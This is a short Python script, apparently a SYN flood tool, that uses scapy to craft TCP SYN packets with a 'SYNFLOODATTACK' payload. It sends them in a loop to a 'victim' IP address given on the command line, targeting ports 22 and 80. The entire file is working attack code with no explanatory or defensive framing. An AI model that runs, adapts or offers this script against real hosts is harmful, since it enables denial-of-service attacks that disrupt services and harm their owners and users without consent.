#!/usr/bin/python
import sys
#Change log level to suppress annoying IPv6 error
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

ipvictim = sys.argv[1:]

topt=[('Timestamp', (10,0))]

ip      = IP(dst=ipvictim, id=1111,ttl=99)

tcp     = TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S",options=topt)

payload = "SYNFLOODATTACK"

pkt     = ip/tcp/payload

ans,unans=srloop(pkt,inter=0.3,retry=2,timeout=4)
